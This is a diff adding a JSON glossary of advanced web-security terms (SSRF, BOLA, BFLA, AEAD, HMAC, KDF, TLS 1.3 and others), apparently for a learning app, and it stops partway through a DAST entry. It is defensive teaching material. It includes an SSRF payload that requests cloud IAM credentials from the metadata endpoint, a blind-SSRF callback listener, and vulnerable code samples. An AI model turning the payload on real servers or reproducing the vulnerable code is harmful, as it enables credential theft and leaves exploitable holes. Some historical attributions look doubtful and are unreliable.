@@ -1,0 +1,605 @@
+{
+  "stack": "web-security-advanced",
+  "words": [
+    {
+      "id": "web-adv-0010-0000-0000-0000-000000000001",
+      "word": "SSRF",
+      "pronunciation": "ES-es-ar-EF",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Server-Side Request Forgery; server fetches an attacker-supplied URL, using its own credentials and network position.",
+      "simpleDefinition": "SSRF tricks a server into making HTTP requests on behalf of an attacker. The server — not the attacker's browser — sends the request, so it carries the server's IP address, IAM credentials, and access to internal services. Webhooks, image-import URLs, and PDF generators that fetch remote assets are the most common entry points.",
+      "longDefinition": "Server-Side Request Forgery (SSRF) occurs wherever a web application accepts a user-supplied URL and fetches it server-side without adequate controls. The attack surface includes webhook endpoints, URL-import features, document converters, translation proxies, and URL-preview generators. The threat model rests on three asymmetries: network position (the server may be inside a VPC that blocks direct attacker access), implicit trust (cloud metadata endpoints and internal APIs accept requests from the application tier without authentication), and credential exposure (responses may carry IAM tokens, API keys, or internal service secrets). The canonical real-world case is the Capital One 2019 breach, in which a misconfigured WAF with an overprivileged IAM role was exploited via SSRF against the AWS IMDSv1 endpoint at 169.254.169.254, resulting in the exfiltration of over 100 million credit application records. SSRF was added as OWASP A10:2021, elevated from an obscure footnote to a standalone category precisely because cloud deployments made the internal metadata endpoint a near-universal high-value target.",
+      "connector": "Think of SSRF like a drive-through proxy: you order through the speaker, but the food ends up in your car. You tell the server where to go, it goes there using its own keycard and returns whatever it finds — internal APIs, cloud credentials, private network scans.",
+      "techContext": "An attacker submitting `{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role\"}` to a webhook endpoint may receive temporary AWS credentials if the server is running on EC2 without IMDSv2 enforcement.",
+      "exampleSentence": "After discovering SSRF in the invoice-upload feature, the researcher pivoted to the internal Kubernetes API server and retrieved service-account tokens in under ten minutes.",
+      "codeExample": {
+        "language": "python",
+        "code": "import ipaddress, socket, urllib.parse\n\nBLOCKED = [\n    ipaddress.ip_network(\"169.254.0.0/16\"),  # IMDS\n    ipaddress.ip_network(\"10.0.0.0/8\"),\n    ipaddress.ip_network(\"172.16.0.0/12\"),\n    ipaddress.ip_network(\"192.168.0.0/16\"),\n    ipaddress.ip_network(\"127.0.0.0/8\"),\n]\n\ndef is_safe_url(url: str) -> bool:\n    p = urllib.parse.urlparse(url)\n    if p.scheme not in (\"http\", \"https\"):\n        return False  # block file://, gopher://, dict://\n    resolved = socket.getaddrinfo(p.hostname, None)[0][4][0]\n    ip = ipaddress.ip_address(resolved)\n    return not any(ip in net for net in BLOCKED)"
+      },
+      "etymology": "Coined in a 2012 blog post by security researcher Jerry Hicks and popularized by PortSwigger and SSRF-research papers through the mid-2010s; the cloud metadata angle elevated it to mainstream awareness around 2019.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "injection", "cloud", "api-security"],
+      "category": "vulnerabilities"
+    },
+    {
+      "id": "web-adv-0020-0000-0000-0000-000000000002",
+      "word": "blind SSRF",
+      "pronunciation": "BLYND ES-es-ar-EF",
+      "partOfSpeech": "noun",
+      "shortDefinition": "SSRF variant where the response is not returned to the attacker; detection relies on out-of-band DNS or timing signals.",
+      "simpleDefinition": "In blind SSRF the server makes your request but never shows you the response. You prove it happened by watching your own DNS resolver or HTTP listener for a callback from the server's IP. Even without a visible response, blind SSRF can pivot to internal services that accept commands rather than only returning data.",
+      "longDefinition": "Blind SSRF arises when the application fetches an attacker-controlled URL but discards or never surfaces the response body — a webhook checker, SEO crawler, or SSL certificate verifier may return only a status code. Detection techniques include: out-of-band DNS callbacks (submitting a URL pointing to an attacker-controlled subdomain such as via Burp Collaborator or interactsh, then watching DNS logs for a lookup from the server's IP), HTTP callbacks (running a listener that logs incoming requests and their source IPs), time-based inference (internal hosts respond quickly; non-existent hosts time out — measurable even without a response body), and error-message leakage (applications that return different errors for unreachable vs refused connections expose network topology). Exploitation chains for blind SSRF include gopher:// protocol tricks to speak raw TCP to internal Redis, Memcached, or SMTP servers; pivoting to internal admin APIs that accept command parameters; and abusing Kubernetes API servers that trust pod-network traffic without mTLS.",
+      "connector": "Blind SSRF is like hiring a courier to deliver a note to a locked building and timing how quickly they return — you never see what happened inside, but the return time and any callback tell you whether someone was home.",
+      "techContext": "A bug bounty researcher confirming blind SSRF typically registers a unique Burp Collaborator domain, submits it as the webhook URL, and waits for the DNS interaction log to show a lookup from the target server's outbound IP.",
+      "exampleSentence": "The security researcher confirmed blind SSRF by submitting a Collaborator URL to the PDF export endpoint and observing a DNS lookup arrive from the application server's egress IP within two seconds.",
+      "codeExample": {
+        "language": "python",
+        "code": "# Detect blind SSRF with an out-of-band HTTP callback server\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\n\nclass CallbackHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        print(f\"[SSRF callback] From: {self.client_address[0]}\")\n        print(f\"[SSRF callback] Path: {self.path}\")\n        self.send_response(200)\n        self.end_headers()\n\n# Submit http://<your-server>/ssrf-test as the webhook URL\n# If the app fetches it, this server logs the server's outbound IP\nHTTPServer(('0.0.0.0', 8080), CallbackHandler).serve_forever()"
+      },
+      "etymology": "\"Blind\" borrowed from blind SQL injection — the attacker cannot see the result directly and must use side-channel techniques to confirm the vulnerability; the SSRF-specific usage became standard terminology around 2016.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "injection", "cloud"],
+      "category": "vulnerabilities"
+    },
+    {
+      "id": "web-adv-0030-0000-0000-0000-000000000003",
+      "word": "BOLA",
+      "pronunciation": "BOH-lah",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Broken Object-Level Authorization (OWASP API #1); API returns any object by ID without checking caller ownership.",
+      "simpleDefinition": "BOLA is the API-first renaming of IDOR. An endpoint accepts an object ID, looks it up, and returns it — without verifying that the requesting user owns or is authorized to access that object. Changing an order ID in the URL from your own to another user's yields that user's data. BOLA has ranked as the single most critical API security risk since the OWASP API Top 10 was introduced in 2019.",
+      "longDefinition": "Broken Object-Level Authorization (BOLA), defined as OWASP API1:2023, is the most widespread and highest-impact category in the API security landscape. The root cause is a missing or bypassed authorization check at the resource-retrieval layer: the application authenticates the caller (knows who they are) but fails to authorize the access (does not verify they are allowed to access that specific object). APIs are particularly susceptible because they expose internal identifiers — database row IDs, UUIDs, account numbers — that clients must supply in every request. Sequential integer IDs make enumeration trivial; even UUIDs can be harvested from other legitimate API responses and replayed. BOLA manifests in GET (data leakage), PUT/PATCH (unauthorized modification), and DELETE (unauthorized deletion) operations. In financial APIs, BOLA on account endpoints has led to full exfiltration of transaction histories across entire user bases. The defense requires enforcing ownership checks server-side on every object retrieval: verify that the authenticated principal is the owner of or has been explicitly granted access to the requested object.",
+      "connector": "BOLA is the equivalent of a hotel that gives you a room key and then lets you open any room if you just ask for its number — the lock exists, but asking for a different room number bypasses it entirely.",
+      "techContext": "A BOLA finding in a bug bounty report typically shows two cURL commands: one authenticated as user A fetching `/api/orders/10482`, and one authenticated as user B fetching the same URL — both returning data belonging to user A.",
+      "exampleSentence": "The BOLA vulnerability in the fintech API allowed any authenticated user to retrieve another customer's full transaction history by incrementing the account_id path parameter.",
+      "codeExample": {
+        "language": "python",
+        "code": "# VULNERABLE — fetches any order without ownership check\n@app.get(\"/api/orders/{order_id}\")\ndef get_order(order_id: int, user=Depends(get_current_user)):\n    return db.query(Order).filter_by(id=order_id).first()\n\n# SECURE — enforces object-level authorization\n@app.get(\"/api/orders/{order_id}\")\ndef get_order(order_id: int, user=Depends(get_current_user)):\n    order = db.query(Order).filter_by(id=order_id).first()\n    if order is None or order.customer_id != user.id:\n        raise HTTPException(status_code=403, detail=\"Forbidden\")\n    return order"
+      },
+      "etymology": "BOLA is the OWASP API Security Top 10 term (introduced 2019) for what the OWASP Web Application Top 10 has called IDOR (Insecure Direct Object Reference) since 2007; the rename reflects an API-first framing.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "api-security", "authorization"],
+      "category": "vulnerabilities"
+    },
+    {
+      "id": "web-adv-0040-0000-0000-0000-000000000004",
+      "word": "BFLA",
+      "pronunciation": "BEE-flah",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Broken Function-Level Authorization; user calls admin or privileged API endpoints not intended for their role.",
+      "simpleDefinition": "BFLA is what happens when admin-only API endpoints are accessible by ordinary authenticated users — because the code checks authentication but not role. The admin `/delete-user` button is hidden in the UI, but any authenticated user who discovers and calls the URL directly succeeds. BFLA is OWASP API5:2023.",
+      "longDefinition": "Broken Function-Level Authorization (BOLA addresses the data dimension; BFLA addresses the function dimension) occurs when higher-privilege operations — administrative endpoints, billing actions, bulk data exports — are accessible to lower-privilege callers. The canonical failure pattern: an application has separate URL paths for user and admin operations (`/api/v1/users` vs `/api/v1/admin/users`), but the authorization check confirms only that the request carries a valid token, not that the token belongs to an admin-tier principal. BFLA is widespread in mobile app backends, where admin functions are assumed to be hidden because the UI does not expose them, and in internal tooling promoted to public APIs where the original network-level trust has been removed. Three sub-patterns are particularly common: HTTP method confusion (GET has a role check, DELETE does not), URL manipulation (guessing admin-prefixed paths), and business-logic privilege escalation (calling a function that promotes a user's own account tier). Detection requires capturing all URLs visible in admin sessions and replaying each with a low-privilege token.",
+      "connector": "BFLA is like a bank where the vault door has a \"manager only\" sign but no actual lock — any teller who walks up and turns the handle gets in, because the sign was the only control.",
+      "techContext": "A BFLA finding is confirmed by capturing an admin request such as `DELETE /api/v1/admin/users/42` in Burp Suite, replacing the admin's Bearer token with a regular user's token, replaying the request, and receiving a 200 response instead of 403.",
+      "exampleSentence": "Testers discovered BFLA in the SaaS platform by directly calling the admin user-deletion endpoint with a free-tier account token, successfully removing accounts belonging to paying customers.",
+      "codeExample": {
+        "language": "python",
+        "code": "# VULNERABLE — authenticated but not authorized\n@app.delete(\"/api/v1/admin/users/{user_id}\")\ndef delete_user(user_id: int, caller=Depends(get_current_user)):\n    db.delete(User, user_id)   # no role check\n    return {\"status\": \"deleted\"}\n\n# SECURE — require admin role at the function level\n@app.delete(\"/api/v1/admin/users/{user_id}\")\ndef delete_user(\n    user_id: int,\n    caller=Depends(require_role(\"admin\")),  # 403 if not admin\n):\n    db.delete(User, user_id)\n    return {\"status\": \"deleted\"}"
+      },
+      "etymology": "OWASP API Security Top 10 term introduced in 2019, distinct from BOLA to separate the data-object access failure (BOLA) from the privileged-function access failure (BFLA); became OWASP API5:2023.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "api-security", "authorization"],
+      "category": "vulnerabilities"
+    },
+    {
+      "id": "web-adv-0050-0000-0000-0000-000000000005",
+      "word": "prepared statements",
+      "pronunciation": "preh-PAIRD STATE-ments",
+      "partOfSpeech": "noun",
+      "shortDefinition": "SQL feature that sends query structure and data separately, making structural injection impossible.",
+      "simpleDefinition": "A prepared statement separates the SQL skeleton from the data that fills it. The database compiles the query structure first, then binds the user-supplied values as pure data — not as SQL text. No matter what characters the user supplies, they can never alter the query's structure because the parser has already run.",
+      "longDefinition": "Prepared statements (also called parameterized queries) are the primary and most reliable defense against SQL injection. In the classic vulnerable pattern, user input is concatenated into a query string and the database engine parses the combined result, making it impossible to distinguish developer-intended SQL from attacker-injected SQL. Prepared statements break this by splitting the process into two phases: first, the driver sends the query template with placeholders to the database, which compiles it into an execution plan; second, user-supplied values are bound to those placeholders as typed data parameters. The database engine never re-parses the query with the data values substituted — it executes the pre-compiled plan with the data applied. This structural separation makes SQL injection mechanically impossible for the parameterized portions. Prepared statements work across all major databases (PostgreSQL, MySQL, SQLite, MSSQL, Oracle) and are available in every ORM and database driver. ORMs like SQLAlchemy, Hibernate, and ActiveRecord use prepared statements by default. The only remaining injection surface is dynamically constructed table names or column names — those must be validated against an allowlist because parameters cannot be used for identifiers.",
+      "connector": "A prepared statement is like a form with blank fields: the form's structure is printed in advance and the data is filled in at submission time. An attacker who fills in `Robert'); DROP TABLE students;--` just gets that string stored as a name — the semicolons and SQL keywords are treated as text, not commands.",
+      "techContext": "After switching from string-formatted queries to SQLAlchemy's parameterized syntax, the security team's SQLMap scan returned zero injection findings across 200 endpoints that had previously shown exploitable vulnerabilities.",
+      "exampleSentence": "Migrating 400 raw SQL queries to prepared statements across the legacy PHP codebase eliminated every SQL injection finding in the next penetration test.",
+      "codeExample": {
+        "language": "python",
+        "code": "import sqlite3\n\nconn = sqlite3.connect(\"app.db\")\n\n# VULNERABLE — string concatenation\nuser_id = request.args[\"id\"]\nconn.execute(\"SELECT * FROM users WHERE id = \" + user_id)\n\n# SECURE — prepared statement (parameterized query)\n# The ? placeholder is compiled first; user_id is bound as data\nconn.execute(\n    \"SELECT * FROM users WHERE id = ?\",\n    (user_id,)          # tuple of parameters — never interpreted as SQL\n)"
+      },
+      "etymology": "\"Prepared\" refers to the pre-compilation step; the feature dates to the ANSI SQL standard and has been available in most relational database systems since the 1990s; the security framing became prominent with OWASP guidance in the mid-2000s.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "injection", "database", "defenses"],
+      "category": "defenses"
+    },
+    {
+      "id": "web-adv-0060-0000-0000-0000-000000000006",
+      "word": "AEAD",
+      "pronunciation": "AY-eed",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Authenticated Encryption with Associated Data; cipher mode providing both confidentiality and integrity in one operation.",
+      "simpleDefinition": "AEAD encrypts data and produces a tamper-detecting authentication tag in a single pass. If anyone modifies the ciphertext or the unencrypted header data (the \"associated data\") attached to it, decryption fails loudly before any plaintext is released. AES-GCM and ChaCha20-Poly1305 are the two AEAD algorithms developers need to know.",
+      "longDefinition": "Authenticated Encryption with Associated Data (AEAD) solves the failure mode of encryption-only schemes: pure encryption provides confidentiality but not integrity. An attacker can flip bits in a CBC ciphertext and predictably corrupt the decrypted output without knowing the key — a property exploited by padding-oracle attacks. AEAD bakes authentication into the cipher mode. It takes a key, nonce, optional associated data (plaintext metadata), and plaintext, and produces ciphertext plus an authentication tag. Decryption requires the same key, the same nonce, and the same associated data; if any input differs, decryption returns an error before producing any plaintext. The associated data component — authenticated but not encrypted — allows binding unencrypted context (user IDs, protocol version bytes, session metadata) to a ciphertext, preventing context-confusion attacks where a ciphertext encrypted for one context is replayed in another. The two AEAD constructions relevant to developers are AES-GCM (hardware-accelerated on x86/ARM via AES-NI, nonce must be unique per (key, message) pair) and ChaCha20-Poly1305 (software-efficient, resistant to timing side-channels without hardware support, preferred on constrained devices). Both are mandatory in TLS 1.3, which removed all non-AEAD cipher suites.",
+      "connector": "AEAD is like a tamper-evident envelope with a wax seal over both the contents and the recipient's address — if anyone opens the envelope, changes a word, or readdresses it to the wrong person, the seal breaks visibly before the recipient reads it.",
+      "techContext": "When using AES-GCM, generating a fresh cryptographically random 96-bit nonce for every encryption call is mandatory; nonce reuse with the same key is catastrophic and allows recovery of both plaintexts and the authentication key.",
+      "exampleSentence": "Upgrading from AES-CBC to AES-256-GCM eliminated the padding oracle risk and added integrity protection, allowing the API to detect any in-transit modification of encrypted payloads.",
+      "codeExample": {
+        "language": "python",
+        "code": "from cryptography.hazmat.primitives.ciphers.aead import AESGCM\nimport os\n\nkey = AESGCM.generate_key(bit_length=256)\naesgcm = AESGCM(key)\n\n# Encrypt — nonce must be unique per message\nnonce = os.urandom(12)         # 96-bit random nonce\naad   = b\"user_id:42\"          # associated data — authenticated, not encrypted\nct    = aesgcm.encrypt(nonce, b\"secret payload\", aad)\n\n# Decrypt — fails with InvalidTag if ciphertext or aad was modified\nplaintext = aesgcm.decrypt(nonce, ct, aad)"
+      },
+      "etymology": "AEAD is an acronym coined in academic cryptography literature in the early 2000s; the most influential paper is \"Authenticated-Encryption with Associated-Data\" by Phillip Rogaway (2002), which systematized the concept.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "cryptography", "defenses"],
+      "category": "cryptography"
+    },
+    {
+      "id": "web-adv-0070-0000-0000-0000-000000000007",
+      "word": "HMAC",
+      "pronunciation": "AITCH-mak",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Hash-based Message Authentication Code; keyed hash proving both data integrity and sender authenticity.",
+      "simpleDefinition": "HMAC ties a secret key to a hash function so only someone holding the key can produce or verify the result. It proves two things: the message has not been modified, and it came from a party that knows the shared secret. HMAC-SHA256 is how GitHub signs webhook payloads, how Stripe verifies payment notifications, and how JWTs with shared secrets are authenticated.",
+      "longDefinition": "HMAC (Hash-based Message Authentication Code) addresses the fundamental limitation of plain hash functions: anyone can compute SHA256(message) without a key, so a plain hash provides no authentication — only integrity. The naive fix of prepending a key (`SHA256(key || message)`) is vulnerable to length extension attacks exploiting the Merkle-Damgard construction of SHA-2, where an attacker knowing the MAC can extend the message and compute a valid MAC for the extended version without knowing the key. HMAC closes this by using a double-hash construction: `HMAC(K, m) = H((K XOR opad) || H((K XOR ipad) || m))`. The inner hash covers the key-padded message; the outer hash covers the key-padded inner result. This structure prevents length extension attacks. HMAC-SHA256 appears throughout production systems: TLS 1.2 PRF uses HMAC-SHA256 to derive keying material; JWT HS256 tokens are HMAC-SHA256 signed; AWS Signature Version 4 signs API requests with a chain of HMAC-SHA256 operations; GitHub, Stripe, and Twilio sign all webhook events with HMAC-SHA256 over the payload. The critical implementation rule: always use constant-time comparison when verifying HMACs, because standard string equality short-circuits on the first differing byte and leaks timing information that allows MAC forgery byte by byte.",
+      "connector": "HMAC is like a wax seal stamped with a unique signet ring — you can verify the seal belongs to the expected sender without being able to forge a matching seal yourself, because you need the ring (the key) to produce it.",
+      "techContext": "When verifying a GitHub webhook signature, compute `HMAC-SHA256(secret, payload)` and compare it to the `X-Hub-Signature-256` header using a constant-time comparison function to prevent timing-based forgery.",
+      "exampleSentence": "The payment service verifies every incoming webhook with HMAC-SHA256 before processing it, ensuring that only Stripe — which holds the shared secret — could have generated the payload.",
+      "codeExample": {
+        "language": "python",
+        "code": "import hmac, hashlib\n\nSECRET = b\"super-secret-webhook-key\"\n\ndef verify_github_webhook(payload: bytes, signature_header: str) -> bool:\n    expected = hmac.new(SECRET, payload, hashlib.sha256).hexdigest()\n    received = signature_header.removeprefix(\"sha256=\")\n    # MUST use constant-time comparison to prevent timing oracle\n    return hmac.compare_digest(expected, received)"
+      },
+      "etymology": "HMAC was defined by Bellare, Canetti, and Krawczyk in RFC 2104 (1997) after the length-extension vulnerability of naive keyed hashing was demonstrated; the acronym stands for Hash-based (or Keyed-Hash) Message Authentication Code.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "cryptography", "api-security"],
+      "category": "cryptography"
+    },
+    {
+      "id": "web-adv-0080-0000-0000-0000-000000000008",
+      "word": "KDF",
+      "pronunciation": "KAY-dee-EF",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Key Derivation Function; derives cryptographic keys from passwords or secrets with configurable work cost.",
+      "simpleDefinition": "A KDF is a deliberately slow hash designed to make brute-force attacks expensive. SHA-256 runs billions of times per second on a GPU — useless for passwords. A KDF like Argon2id requires significant RAM and CPU time per computation, turning a GPU cluster into a minor inconvenience. Always use a KDF for password storage, never a plain hash.",
+      "longDefinition": "Key Derivation Functions solve the speed problem of general-purpose hash functions for password storage and key derivation. SHA-256 executes at roughly 10 billion operations per second on modern GPU hardware, meaning an attacker with a leaked password hash database can brute-force typical user passwords in minutes. KDFs address this by being deliberately expensive — tunable to require a fixed amount of CPU time, memory, or both, regardless of how fast the hardware becomes. The three KDFs developers must know are: PBKDF2, which iterates HMAC-SHA256 hundreds of thousands of times (CPU-bound, not memory-hard — GPU attacks remain practical at high iteration counts; use when FIPS compliance is mandatory); scrypt, which adds memory-hardness on top of PBKDF2, requiring a tunable amount of RAM that makes GPU parallelism expensive; and Argon2id, which won the 2015 Password Hashing Competition and is the current consensus recommendation from OWASP, Aumasson's Serious Cryptography, and the real-world-cryptography community. Argon2id requires both memory (m parameter) and time (t parameter), making it simultaneously resistant to GPU attacks and side-channel timing attacks. Every password must be hashed with a unique, cryptographically random salt (16+ bytes) to prevent rainbow table attacks. OWASP's 2024 recommended Argon2id parameters: m=19456 (19 MiB), t=2, p=1.",
+      "connector": "A KDF is a speed bump deliberately engineered into the hashing road — not a yield sign, but a series of deep concrete ridges that force every vehicle to slow down, making the road useless as a drag-racing strip no matter how powerful the engine.",
+      "techContext": "When a password database is leaked, Argon2id-hashed passwords with current parameters require roughly 3 seconds of work per guess on dedicated hardware, compared to milliseconds for SHA-256 — effectively making offline brute-force infeasible for non-trivial passwords.",
+      "exampleSentence": "Replacing the legacy MD5 password hashes with Argon2id reduced the credential-stuffing success rate in penetration tests from 60% to effectively zero against the same wordlist.",
+      "codeExample": {
+        "language": "python",
+        "code": "import argon2  # pip install argon2-cffi\n\n# Argon2id — OWASP 2024 parameters\nph = argon2.PasswordHasher(\n    time_cost=2,           # t=2 iterations\n    memory_cost=19456,     # m=19 MiB\n    parallelism=1,         # p=1\n    hash_len=32,\n    salt_len=16,\n)\n\nhashed = ph.hash(\"user_password\")\n\ntry:\n    ph.verify(hashed, \"user_password\")  # True\n    if ph.check_needs_rehash(hashed):\n        hashed = ph.hash(\"user_password\")  # upgrade on login\nexcept argon2.exceptions.VerifyMismatchError:\n    pass  # wrong password"
+      },
+      "etymology": "Key Derivation Function is a term from cryptographic standards literature; Argon2 (from Greek argon, 'lazy/slow', evoking the noble-gas inertness) was designed by Biryukov, Dinu, and Großschädl and won the PHC in 2015.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "cryptography", "authentication"],
+      "category": "cryptography"
+    },
+    {
+      "id": "web-adv-0090-0000-0000-0000-000000000009",
+      "word": "TLS 1.3",
+      "pronunciation": "TEE-el-ES wun-POINT-three",
+      "partOfSpeech": "noun",
+      "shortDefinition": "TLS version that removes weak cipher suites, mandates forward secrecy, and reduces handshake round trips.",
+      "simpleDefinition": "TLS 1.3 (RFC 8446, 2018) is a near-complete redesign of TLS that strips out every cipher suite and key exchange mechanism behind past attacks — RSA static key exchange, CBC modes, SHA-1, compression — and cuts the connection handshake from two round trips to one. Every remaining cipher suite is AEAD, and forward secrecy is mandatory.",
+      "longDefinition": "TLS 1.3 was standardized in RFC 8446 (August 2018) after four years of development and eliminates the mechanisms behind BEAST, POODLE, DROWN, LOGJAM, FREAK, and the CRIME compression attack in a single stroke. Key changes from TLS 1.2: RSA static key exchange is removed entirely — TLS 1.3 mandates ephemeral Diffie-Hellman key exchange (ECDHE over X25519 or P-256), which provides forward secrecy for every session; all CBC cipher suites are removed, leaving only three AEAD suites (AES-128-GCM, AES-256-GCM, ChaCha20-Poly1305); SHA-1 and MD5 are removed from signature schemes; TLS compression is removed; and session resumption via Diffie-Hellman replaces the insecure session ticket mechanism. The handshake reduces from two round trips to one — the client sends its key share in the first message, and the server responds with its key share and immediately encrypts subsequent messages, making more of the handshake opaque to passive observers. The 0-RTT (zero round-trip) resumption mode allows sending application data in the very first packet when resuming an existing session, but at the cost of replay vulnerability — use only for idempotent, replay-safe operations. TLS 1.0 and 1.1 are formally deprecated by RFC 8996 (2021) and prohibited by PCI DSS.",
+      "connector": "TLS 1.3 is the security equivalent of a building evacuation after discovering the old wiring is a fire hazard — rather than patching individual circuits, the entire electrical system was rewired from scratch, and anything that couldn't meet the new code was simply removed.",
+      "techContext": "Configuring an Nginx server for TLS 1.3: set `ssl_protocols TLSv1.3;` and `ssl_prefer_server_ciphers off;` — the latter is correct for 1.3 because all remaining cipher suites are equally strong and client preference can safely be honored.",
+      "exampleSentence": "After enforcing TLS 1.3 minimum on the API gateway, the security scanner's protocol downgrade tests returned zero findings, confirming that all POODLE-era vulnerabilities were no longer reachable.",
+      "codeExample": {
+        "language": "bash",
+        "code": "# Nginx TLS 1.3 configuration\nssl_protocols TLSv1.3;\nssl_prefer_server_ciphers off;     # client can choose; all suites are AEAD\nssl_session_timeout 1d;\nssl_session_cache shared:SSL:50m;\nssl_session_tickets off;           # disable for perfect forward secrecy\n\n# Verify TLS 1.3 is negotiated\ncurl -v --tlsv1.3 https://api.example.com 2>&1 | grep 'SSL connection'\n# * SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384"
+      },
+      "etymology": "TLS (Transport Layer Security) replaced SSL in RFC 2246 (1999); version 1.3 designates the fourth major revision, standardized in RFC 8446 (2018) after version 1.2 (RFC 5246, 2008).",
+      "unlockLevel": 4,
+      "tags": ["web-security", "cryptography", "networking"],
+      "category": "cryptography"
+    },
+    {
+      "id": "web-adv-0100-0000-0000-0000-000000000010",
+      "word": "certificate transparency",
+      "pronunciation": "sur-TIF-ih-ket trans-PEHR-en-see",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Public append-only logs of every TLS certificate issued, enabling detection of misissued or rogue certificates.",
+      "simpleDefinition": "Certificate Transparency requires every TLS certificate issuer (CA) to record certificates in public append-only logs before browsers trust them. Anyone can search these logs for their domains. If an attacker or a compromised CA issues a fraudulent certificate for your domain, you see it in the logs within hours — before it can be used in an undetected man-in-the-middle attack.",
+      "longDefinition": "Certificate Transparency (CT, RFC 6962) was proposed by Ben Laurie at Google in 2013 following the DigiNotar incident — a compromised Dutch CA that issued fraudulent certificates for google.com, enabling man-in-the-middle attacks on Iranian users that went undetected until the certificates appeared in the wild. CT solves the detection problem by requiring CAs to submit every issued certificate to at least two independent, public, append-only CT logs before the certificate becomes trusted. Logs are cryptographically verified Merkle trees: certificates cannot be removed or silently altered. Upon submission, the log returns a Signed Certificate Timestamp (SCT) — a cryptographic promise that the certificate was logged — which the CA embeds in the certificate or delivers via TLS extension stapling. Browsers (Chrome since 2018, Safari since 2021) refuse to trust certificates lacking valid SCTs. This means every publicly trusted TLS certificate is visible to domain operators and security researchers. Developers and operators should monitor CT logs for their domains using crt.sh, Cloudflare's CT Monitor, or Facebook's Certificate Transparency Monitoring — receiving alerts when any CA issues any certificate for their domain, which exposes misissued or unauthorized certificates within minutes of issuance.",
+      "connector": "Certificate Transparency is a public noticeboard that every locksmith (CA) must post on before handing out a key copy for your address — you and anyone else can check whether an unauthorized locksmith has recently made a copy without your knowledge.",
+      "techContext": "Searching crt.sh for `%.example.com` reveals every certificate ever issued for that domain and all its subdomains, including wildcard certificates that might have been issued without the domain owner's knowledge.",
+      "exampleSentence": "The security team discovered a rogue wildcard certificate for their domain through CT log monitoring within 90 minutes of a phishing-campaign CA compromise, before any user was targeted.",
+      "codeExample": {
+        "language": "bash",
+        "code": "# Query crt.sh for all certificates issued for a domain\ncurl -s \"https://crt.sh/?q=%25.example.com&output=json\" \\\n  | jq '.[] | {id: .id, common_name: .common_name,\n               issuer: .issuer_name, logged_at: .entry_timestamp}'\n\n# Monitor for new certificates (run in CI or as a cron job)\n# Alert if any unexpected issuers appear in results"
+      },
+      "etymology": "\"Certificate Transparency\" coined by Ben Laurie (Google) in the 2013 RFC 6962 draft; the Merkle tree audit log design draws on transparency concepts from cryptographic verifiable-log literature.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "cryptography", "pki", "monitoring"],
+      "category": "concepts"
+    },
+    {
+      "id": "web-adv-0110-0000-0000-0000-000000000011",
+      "word": "SAST",
+      "pronunciation": "SAST",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Static Application Security Testing; analyzes source code without executing it to find coding flaws and insecure APIs.",
+      "simpleDefinition": "SAST tools read your source code (or compiled bytecode) looking for patterns that indicate security vulnerabilities — unsanitized data flowing to a SQL sink, calls to dangerous shell APIs, hardcoded credentials. They run before the application is deployed, typically on every commit or pull request, providing fast feedback. The trade-off: high false-positive rates require triage.",
+      "longDefinition": "Static Application Security Testing (SAST) analyzes source code, bytecode, or binary representations without executing the application. The primary technique is taint analysis: tracking data from untrusted sources (HTTP request parameters, headers, file reads) through the codebase to dangerous sinks (SQL queries, shell commands, template renderers, HTML output points). If a data flow path from source to sink lacks appropriate sanitization or parameterization, SAST flags it. Three analysis techniques underpin most SAST tools: pattern or AST matching (simple, fast, high false-positive rate — the tool searches the parsed abstract syntax tree for known-dangerous API calls regardless of reachability); data-flow analysis (more precise — tracks values across variable assignments and function boundaries); and taint analysis (most precise — propagates taint labels through the data-flow graph). Major SAST tools include Semgrep (rule-based, highly customizable, widely used for PR gates), SonarQube/SonarCloud (multi-language, broadly deployed), Checkmarx, Veracode, and CodeQL (GitHub's semantic code analysis engine). SAST's primary limitation is false positives — rates of 10–50% are common — because static analysis cannot model all runtime behavior: a data-flow path may be theoretically vulnerable but unreachable due to runtime access controls. Mature SAST programs use suppression annotations and custom rule tuning to reduce noise.",
+      "connector": "SAST is like a grammar checker for security: it reads your code looking for dangerous sentence structures before you run it, highlighting patterns it knows tend to cause problems — but it sometimes flags valid sentences as suspicious because it lacks the full context of what your program actually does at runtime.",
+      "techContext": "Running Semgrep with the OWASP Top 10 ruleset on every PR provides sub-minute security feedback and can be tuned to block merges only on high-confidence findings, reducing friction while maintaining coverage.",
+      "exampleSentence": "SAST surfaced 14 SQL injection sinks in the legacy PHP module during the first scan, all resulting from string-concatenated queries that had never been reviewed by the security team.",
+      "codeExample": {
+        "language": "yaml",
+        "code": "# GitHub Actions: run Semgrep SAST on every PR\njobs:\n  sast:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Run Semgrep\n        uses: returntocorp/semgrep-action@v1\n        with:\n          config: >\n            p/owasp-top-ten\n            p/python\n            p/secrets\n        env:\n          SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}"
+      },
+      "etymology": "SAST as an acronym was standardized by Gartner in the early 2010s to categorize the static analysis tool market; \"static\" distinguishes it from dynamic (DAST) and interactive (IAST) testing techniques.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "testing", "devsecops", "tooling"],
+      "category": "testing"
+    },
+    {
+      "id": "web-adv-0120-0000-0000-0000-000000000012",
+      "word": "DAST",
+      "pronunciation": "DAST",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Dynamic Application Security Testing; probes a running application from the outside to find runtime vulnerabilities.",
